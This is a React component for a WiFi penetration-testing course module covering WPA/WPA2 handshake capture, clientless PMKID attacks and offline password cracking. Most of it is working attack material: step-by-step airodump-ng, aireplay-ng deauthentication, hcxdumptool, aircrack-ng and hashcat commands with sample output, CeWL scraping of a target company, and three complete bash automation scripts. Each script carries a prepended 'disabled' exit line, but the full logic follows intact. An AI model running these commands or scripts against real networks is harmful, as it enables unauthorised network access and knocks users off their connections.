import { Key, AlertTriangle, Check, Info, Shield, Zap } from "lucide-react";
import { CommandBlock } from "../CommandBlock";
import { ScriptBlock } from "../ScriptBlock";

export const WPACracking = () => {
  const handshakeScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# WPA/WPA2 Handshake Capture Automation Script
# For Raspberry Pi 4 with Alfa AWUS036ACH
# Usage: sudo bash capture_handshake.sh <bssid> <channel> <interface> [output_name]

set -e

BSSID=\${1:?"Usage: \$0 <BSSID> <CHANNEL> <INTERFACE> [OUTPUT_NAME]"}
CHANNEL=\${2:?"Please specify channel"}
INTERFACE=\${3:-wlan1mon}
OUTPUT=\${4:-handshake_\$(date +%Y%m%d_%H%M%S)}

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
NC='\\033[0m'

print_status() { echo -e "\${CYAN}[*]\${NC} \$1"; }
print_success() { echo -e "\${GREEN}[+]\${NC} \$1"; }
print_warning() { echo -e "\${YELLOW}[!]\${NC} \$1"; }
print_error() { echo -e "\${RED}[-]\${NC} \$1"; }

# Create output directory
mkdir -p ./handshakes

print_status "WPA/WPA2 Handshake Capture Script"
echo "=========================================="
print_status "Target BSSID: \$BSSID"
print_status "Channel: \$CHANNEL"
print_status "Interface: \$INTERFACE"
print_status "Output: ./handshakes/\$OUTPUT"
echo ""

# Verify interface is in monitor mode
MODE=\$(iwconfig \$INTERFACE 2>/dev/null | grep -oP 'Mode:\\K\\w+' || echo "Unknown")
if [ "\$MODE" != "Monitor" ]; then
    print_error "Interface \$INTERFACE is not in monitor mode!"
    print_status "Run: sudo airmon-ng start \${INTERFACE%mon}"
    exit 1
fi

# Lock to target channel
print_status "Locking to channel \$CHANNEL..."
iw dev \$INTERFACE set channel \$CHANNEL

# Start airodump-ng in background
print_status "Starting packet capture..."
print_warning "Waiting for WPA handshake..."
print_warning "A client must connect/reconnect to capture handshake"
print_status "Tip: Use deauth attack in another terminal to force reconnection"
echo ""

# Capture function
capture_handshake() {
    airodump-ng \\
        --bssid \$BSSID \\
        -c \$CHANNEL \\
        -w ./handshakes/\$OUTPUT \\
        --output-format pcap \\
        \$INTERFACE
}

# Start capture
capture_handshake &
CAPTURE_PID=\$!

# Monitor for handshake
print_status "Monitoring for handshake (Ctrl+C to stop)..."
while true; do
    sleep 5
    
    # Check if capture file exists and has handshake
    if [ -f "./handshakes/\${OUTPUT}-01.cap" ]; then
        # Check for EAPOL packets
        EAPOL_COUNT=\$(tshark -r "./handshakes/\${OUTPUT}-01.cap" -Y "eapol" 2>/dev/null | wc -l || echo "0")
        
        if [ "\$EAPOL_COUNT" -ge 4 ]; then
            print_success "HANDSHAKE CAPTURED! (\$EAPOL_COUNT EAPOL packets)"
            kill \$CAPTURE_PID 2>/dev/null
            break
        else
            echo -ne "\\r\${CYAN}[*]\${NC} EAPOL packets captured: \$EAPOL_COUNT/4 (need 4 for complete handshake)    "
        fi
    fi
done

echo ""
print_success "Capture complete!"
print_status "Verifying handshake with aircrack-ng..."

# Verify handshake
aircrack-ng "./handshakes/\${OUTPUT}-01.cap" 2>/dev/null | head -20

echo ""
print_success "Handshake file: ./handshakes/\${OUTPUT}-01.cap"
print_status "Next step: crack with hashcat or aircrack-ng"
echo ""
print_status "Example: aircrack-ng -w /usr/share/wordlists/rockyou.txt ./handshakes/\${OUTPUT}-01.cap"`;

  const crackingScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# WPA/WPA2 Password Cracking Script
# Supports aircrack-ng, hashcat, and john
# Usage: sudo bash crack_wpa.sh <capture_file> [wordlist]

CAPTURE=\${1:?"Usage: \$0 <CAPTURE_FILE> [WORDLIST]"}
WORDLIST=\${2:-/usr/share/wordlists/rockyou.txt}

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
NC='\\033[0m'

print_status() { echo -e "\${CYAN}[*]\${NC} \$1"; }
print_success() { echo -e "\${GREEN}[+]\${NC} \$1"; }
print_warning() { echo -e "\${YELLOW}[!]\${NC} \$1"; }
print_error() { echo -e "\${RED}[-]\${NC} \$1"; }

echo "=========================================="
echo "      WPA/WPA2 Password Cracking"
echo "=========================================="
echo ""

# Verify capture file exists
if [ ! -f "\$CAPTURE" ]; then
    print_error "Capture file not found: \$CAPTURE"
    exit 1
fi

# Verify wordlist exists
if [ ! -f "\$WORDLIST" ]; then
    print_warning "Wordlist not found: \$WORDLIST"
    print_status "Attempting to decompress rockyou.txt.gz..."
    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
        sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
        WORDLIST="/usr/share/wordlists/rockyou.txt"
    else
        print_error "No wordlist available!"
        exit 1
    fi
fi

print_status "Capture file: \$CAPTURE"
print_status "Wordlist: \$WORDLIST"
print_status "Wordlist size: \$(wc -l < \$WORDLIST) passwords"
echo ""

# Extract network info
print_status "Networks in capture file:"
aircrack-ng \$CAPTURE 2>/dev/null | grep -E "^\\s+[0-9]+" | head -10
echo ""

# Check for hashcat
if command -v hashcat &>/dev/null; then
    print_status "Hashcat available - converting capture for GPU cracking..."
    
    # Convert to hashcat format
    HASH_FILE="\${CAPTURE%.cap}.hc22000"
    
    # Try hcxpcapngtool first (newer), fall back to cap2hccapx
    if command -v hcxpcapngtool &>/dev/null; then
        hcxpcapngtool -o "\$HASH_FILE" "\$CAPTURE" 2>/dev/null
    elif command -v cap2hccapx &>/dev/null; then
        cap2hccapx "\$CAPTURE" "\${CAPTURE%.cap}.hccapx" 2>/dev/null
        HASH_FILE="\${CAPTURE%.cap}.hccapx"
    fi
    
    if [ -f "\$HASH_FILE" ]; then
        print_success "Hash file created: \$HASH_FILE"
        print_status "Starting GPU-accelerated cracking with hashcat..."
        echo ""
        
        # Run hashcat (mode 22000 for WPA-PBKDF2-PMKID+EAPOL)
        hashcat -m 22000 "\$HASH_FILE" "\$WORDLIST" --status --status-timer=10 -O
    fi
else
    print_warning "Hashcat not found - using CPU-based aircrack-ng"
fi

echo ""
print_status "Starting aircrack-ng dictionary attack..."
echo ""

# Run aircrack-ng
aircrack-ng -w "\$WORDLIST" -b auto "\$CAPTURE"

# Check result
if [ \$? -eq 0 ]; then
    print_success "Password found! Check output above."
else
    print_warning "Password not in wordlist."
    print_status "Try a larger wordlist or use hashcat with rules"
fi`;

  const pmkidScript = `#!/bin/bash
# 2027 edition: historical automation disabled; fails before any state change.
printf 'Disabled review artifact. Use synthetic practice; no RF action permitted.\\n' >&2
exit 64

# PMKID Attack Script (Clientless WPA2 Attack)
# Works without waiting for client handshake
# Usage: sudo bash pmkid_attack.sh <interface>

INTERFACE=\${1:-wlan1mon}
OUTPUT="pmkid_\$(date +%Y%m%d_%H%M%S)"

print_status() { echo -e "\\033[0;36m[*]\\033[0m \$1"; }
print_success() { echo -e "\\033[0;32m[+]\\033[0m \$1"; }

echo "=========================================="
echo "     PMKID Attack (Clientless WPA2)"
echo "=========================================="
echo ""

# Check for hcxdumptool
if ! command -v hcxdumptool &>/dev/null; then
    print_status "Installing hcxdumptool..."
    sudo apt install -y hcxdumptool hcxtools
fi

mkdir -p ./pmkid_captures

print_status "Starting PMKID capture on \$INTERFACE..."
print_status "This attack works without any clients connected!"
print_status "Press Ctrl+C after capturing desired PMKIDs"
echo ""

# Capture PMKIDs
sudo hcxdumptool -i \$INTERFACE \\
    --enable_status=1 \\
    -o "./pmkid_captures/\${OUTPUT}.pcapng"

echo ""
print_status "Converting capture to hashcat format..."

# Convert to hashcat format
hcxpcapngtool -o "./pmkid_captures/\${OUTPUT}.hc22000" \\
    "./pmkid_captures/\${OUTPUT}.pcapng"

PMKID_COUNT=\$(wc -l < "./pmkid_captures/\${OUTPUT}.hc22000" 2>/dev/null || echo "0")

print_success "Captured \$PMKID_COUNT PMKIDs"
print_status "Hash file: ./pmkid_captures/\${OUTPUT}.hc22000"
echo ""
print_status "Crack with: hashcat -m 22000 ./pmkid_captures/\${OUTPUT}.hc22000 wordlist.txt"`;

  return (
    <section className="py-16">
      <div className="container mx-auto px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-10 h-10 rounded-lg bg-primary/20 flex items-center justify-center">
              <Key className="w-5 h-5 text-primary" />
            </div>
            <div>
              <span className="text-xs font-mono text-primary">MODULE 04</span>
              <h2 className="text-2xl font-bold text-foreground">WPA/WPA2 Handshake Capture & Cracking</h2>
            </div>
          </div>

          <p className="text-muted-foreground mb-8">
            Capturing and cracking WPA/WPA2 handshakes is the core skill of WiFi penetration testing. This module 
            covers the complete process from handshake capture to password recovery using multiple cracking methods.
          </p>

          {/* Theory Section */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3 flex items-center gap-2">
              <Info className="w-5 h-5 text-primary" />
              Understanding WPA/WPA2 Security
            </h3>
            <div className="space-y-3 text-sm text-muted-foreground">
              <p>
                <strong className="text-foreground">The 4-Way Handshake:</strong> When a client connects to WPA/WPA2, 
                a 4-packet exchange occurs. These packets contain encrypted data derived from the password. By capturing 
                this handshake, we can perform offline password guessing.
              </p>
              <p>
                <strong className="text-foreground">Why It's Crackable:</strong> WPA uses PBKDF2-SHA1 to derive the 
                encryption key from the password and SSID. While computationally intensive, modern GPUs can test 
                millions of passwords per second.
              </p>
              <p>
                <strong className="text-foreground">PMKID Attack:</strong> A newer method that doesn't require a client. 
                Some APs include the PMKID in the first message, allowing clientless attacks.
              </p>
            </div>
          </div>

          {/* Attack Methods */}
          <div className="grid md:grid-cols-2 gap-4 mb-8">
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Shield className="w-8 h-8 text-primary flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">4-Way Handshake</h3>
                  <p className="text-sm text-muted-foreground">
                    Classic method. Requires a client to connect (or be deauthenticated). Works on all WPA/WPA2 networks.
                  </p>
                </div>
              </div>
            </div>
            <div className="p-5 rounded-xl border border-border bg-card">
              <div className="flex items-start gap-3">
                <Zap className="w-8 h-8 text-accent flex-shrink-0" />
                <div>
                  <h3 className="font-semibold text-foreground mb-1">PMKID Attack</h3>
                  <p className="text-sm text-muted-foreground">
                    No client needed. Send association request and capture PMKID. Faster but not all APs vulnerable.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Prerequisites */}
          <div className="p-4 rounded-lg border border-warning/50 bg-warning/10 mb-8">
            <div className="flex items-start gap-3">
              <AlertTriangle className="w-5 h-5 text-warning flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="font-medium text-warning mb-1">Prerequisites</h4>
                <ul className="text-sm text-muted-foreground space-y-1">
                  <li>• Module 02 & 03 completed (monitor mode, network identified)</li>
                  <li>• Target network BSSID and channel known</li>
                  <li>• Strong wordlist available (rockyou.txt minimum)</li>
                  <li>• For GPU cracking: hashcat installed with compatible GPU</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Method 1: 4-Way Handshake Capture */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 1: 4-Way Handshake Capture</h3>
          <p className="text-sm text-muted-foreground mb-4">
            The traditional approach requiring a client to connect or reconnect to the network.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo airodump-ng wlan1mon"
              description="Step 1: Identify target network"
              explanation="Note the BSSID (MAC address) and channel of your target network. Also identify connected clients (STATIONs) for deauth attacks."
            />

            <CommandBlock
              command="sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan1mon"
              description="Step 2: Start focused capture"
              explanation="Lock to the target channel and BSSID. The -w option specifies output filename. Watch for 'WPA handshake: AA:BB:CC:DD:EE:FF' message in the top-right corner."
              output={` CH  6 ][ Elapsed: 5 mins ][ 2024-01-15 16:30 ][ WPA handshake: AA:BB:CC:DD:EE:FF

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -45 100     1234     5678   23   6   54e  WPA2 CCMP   PSK  TargetNetwork`}
            />

            <CommandBlock
              command="sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon"
              description="Step 3 (Optional): Force client reconnection with deauth"
              explanation="-0 5 sends 5 deauth packets. -a is the AP BSSID, -c is the client MAC. Client will automatically reconnect, generating a handshake. (Covered in detail in Module 05)"
            />

            <CommandBlock
              command="ls -la handshake*.cap"
              description="Step 4: Verify capture file exists"
              explanation="Check that the capture file was created and has reasonable size (should be at least a few KB with handshake)."
            />

            <CommandBlock
              command="aircrack-ng handshake-01.cap"
              description="Step 5: Verify handshake in capture"
              explanation="aircrack-ng will parse the file and show if a valid handshake exists. Look for '1 handshake' in the output."
              output={`Opening handshake-01.cap
Read 1523 packets.

   #  BSSID              ESSID                     Encryption

   1  AA:BB:CC:DD:EE:FF  TargetNetwork             WPA (1 handshake)

Choosing first network as target.`}
            />
          </div>

          {/* Method 2: PMKID Attack */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Method 2: PMKID Attack (Clientless)</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Discovered in 2018, this method captures the PMKID from the AP's first EAPOL message without needing a client.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="sudo apt install hcxdumptool hcxtools"
              description="Step 1: Install required tools"
              explanation="hcxdumptool captures PMKIDs, hcxtools converts captures to hashcat format."
            />

            <CommandBlock
              command="sudo hcxdumptool -i wlan1mon --enable_status=1 -o pmkid.pcapng"
              description="Step 2: Capture PMKIDs"
              explanation="Actively sends association requests to APs and captures PMKID responses. Press Ctrl+C to stop. Works without any connected clients!"
              output={`[09:15:33 - 001] AA:BB:CC:DD:EE:FF -> 11:22:33:44:55:66 TargetNetwork [PMKID]
[09:15:34 - 002] AA:BB:CC:DD:EE:02 -> 11:22:33:44:55:66 NeighborWiFi [PMKID]
[09:15:35 - 003] AA:BB:CC:DD:EE:03 -> 11:22:33:44:55:66 OpenNetwork [EAPOL M1M2 PMKID]`}
            />

            <CommandBlock
              command="hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng"
              description="Step 3: Convert to hashcat format"
              explanation="Converts the capture to hashcat's modern 22000 format which supports both PMKID and EAPOL handshakes."
            />

            <CommandBlock
              command="cat pmkid.hc22000 | head -3"
              description="Step 4: Verify hash extraction"
              explanation="Each line is a crackable hash. Format: WPA*type*PMKID/MIC*MAC_AP*MAC_CLIENT*ESSID*..."
              output={`WPA*01*abcdef1234567890*aabbccddeeff*112233445566*TargetNetwork***
WPA*01*0987654321fedcba*aabbccddeeff*112233445566*NeighborWiFi***`}
            />
          </div>

          {/* Password Cracking */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Password Cracking Techniques</h3>
          <p className="text-sm text-muted-foreground mb-4">
            Once you have a handshake or PMKID, crack it offline. GPU cracking is significantly faster than CPU.
          </p>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="gunzip /usr/share/wordlists/rockyou.txt.gz"
              description="Prepare rockyou wordlist"
              explanation="Decompress the rockyou wordlist (14 million passwords from a real data breach). Essential starting point for dictionary attacks."
            />

            <CommandBlock
              command="aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap"
              description="CPU cracking with aircrack-ng"
              explanation="Basic dictionary attack. Tests each password in the wordlist against the handshake. Speed: ~2,000 passwords/second on Pi 4."
              output={`                               Aircrack-ng 1.6

      [00:00:15] 31337/14344392 keys tested (2089.13 k/s)

      Time left: 1 hour 54 minutes 23 seconds                 0.22%

                           KEY FOUND! [ password123 ]

      Master Key     : AB CD EF 12 34 56 78 90 AB CD EF 12 34 56 78 90
                       AB CD EF 12 34 56 78 90 AB CD EF 12 34 56 78 90

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : AB CD EF 12 34 56 78 90 AB CD EF 12 34 56 78 90`}
            />

            <CommandBlock
              command="hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt -O"
              description="GPU cracking with hashcat"
              explanation="-m 22000 is the hash mode for WPA-PBKDF2-PMKID+EAPOL. -O enables optimized kernels. Speed: 100,000+ passwords/second on decent GPU."
            />

            <CommandBlock
              command="hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
              description="GPU cracking with rules"
              explanation="Rules modify each wordlist entry (add numbers, capitalize, etc.). Dramatically increases coverage. best64 applies 64 common mutations to each word."
            />

            <CommandBlock
              command="hashcat -m 22000 pmkid.hc22000 -a 3 ?d?d?d?d?d?d?d?d"
              description="Brute force 8-digit PIN"
              explanation="Attack mode 3 is brute force. ?d represents a digit. This tries all 8-digit combinations (10^8 = 100 million combinations)."
            />

            <CommandBlock
              command="hashcat -m 22000 pmkid.hc22000 -a 3 ?u?l?l?l?l?d?d?d?d"
              description="Brute force common pattern"
              explanation="?u = uppercase, ?l = lowercase. Pattern: Uppercase + 4 lowercase + 4 digits (e.g., 'Hello1234'). Common password format."
            />
          </div>

          {/* Wordlist Management */}
          <div className="p-5 rounded-xl border border-border bg-card mb-8">
            <h3 className="font-semibold text-foreground mb-3">Recommended Wordlists</h3>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-primary font-mono">Wordlist</th>
                    <th className="text-left py-2 pr-4 text-foreground">Size</th>
                    <th className="text-left py-2 text-foreground">Description</th>
                  </tr>
                </thead>
                <tbody className="text-muted-foreground">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">rockyou.txt</td>
                    <td className="py-2 pr-4">14M passwords</td>
                    <td className="py-2">Must-have starting point. Real leaked passwords.</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">SecLists/WiFi</td>
                    <td className="py-2 pr-4">Various</td>
                    <td className="py-2">WiFi-specific wordlists with common router passwords.</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4 font-mono text-primary">weakpass.com</td>
                    <td className="py-2 pr-4">Billions</td>
                    <td className="py-2">Massive combined wordlists for thorough testing.</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4 font-mono text-primary">Custom</td>
                    <td className="py-2 pr-4">Variable</td>
                    <td className="py-2">Generate target-specific lists with CeWL, Crunch.</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          {/* Custom Wordlist Generation */}
          <h3 className="text-lg font-semibold text-foreground mb-4 mt-8">Custom Wordlist Generation</h3>
          
          <div className="space-y-4 mb-8">
            <CommandBlock
              command="crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt"
              description="Generate wordlist with crunch"
              explanation="Creates passwords 8-12 characters using lowercase letters and numbers. WARNING: Can generate massive files!"
            />

            <CommandBlock
              command="cewl -d 2 -m 5 https://target-company.com -w company_words.txt"
              description="Scrape website for words with CeWL"
              explanation="Crawls a website to depth 2, collects words of minimum 5 characters. Great for corporate targets - grabs company-specific terms."
            />

            <CommandBlock
              command="john --wordlist=company_words.txt --rules --stdout > company_mutated.txt"
              description="Mutate wordlist with John the Ripper"
              explanation="Applies mutation rules to a wordlist: adds numbers, changes case, appends special characters. Expands coverage significantly."
            />
          </div>

          {/* Scripts */}
          <h3 className="text-lg font-semibold text-foreground mb-4">Automation Scripts</h3>
          <ScriptBlock
            title="Handshake Capture Script"
            filename="capture_handshake.sh"
            language="bash"
            description="Automated handshake capture with monitoring. Usage: sudo bash capture_handshake.sh AA:BB:CC:DD:EE:FF 6 wlan1mon"
            code={handshakeScript}
          />

          <div className="mt-6">
            <ScriptBlock
              title="Password Cracking Script"
              filename="crack_wpa.sh"
              language="bash"
              description="Multi-tool cracking with hashcat and aircrack-ng. Usage: sudo bash crack_wpa.sh capture.cap [wordlist]"
              code={crackingScript}
            />
          </div>

          <div className="mt-6">
            <ScriptBlock
              title="PMKID Attack Script"
              filename="pmkid_attack.sh"
              language="bash"
              description="Clientless PMKID capture and conversion. Usage: sudo bash pmkid_attack.sh wlan1mon"
              code={pmkidScript}
            />
          </div>

          {/* Completion Checklist */}
          <div className="mt-8 p-5 rounded-xl border border-success/50 bg-success/10">
            <h4 className="font-semibold text-success mb-3 flex items-center gap-2">
              <Check className="w-5 h-5" />
              Module Completion Checklist
            </h4>
            <ul className="space-y-2 text-sm">
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Captured a valid 4-way handshake</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Verified handshake with aircrack-ng</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Performed dictionary attack with rockyou.txt</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Attempted PMKID attack on vulnerable AP</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Converted capture to hashcat format</span>
              </li>
              <li className="flex items-center gap-2 text-muted-foreground">
                <div className="w-4 h-4 rounded border border-muted-foreground/30" />
                <span>Successfully cracked a test password</span>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </section>
  );
};
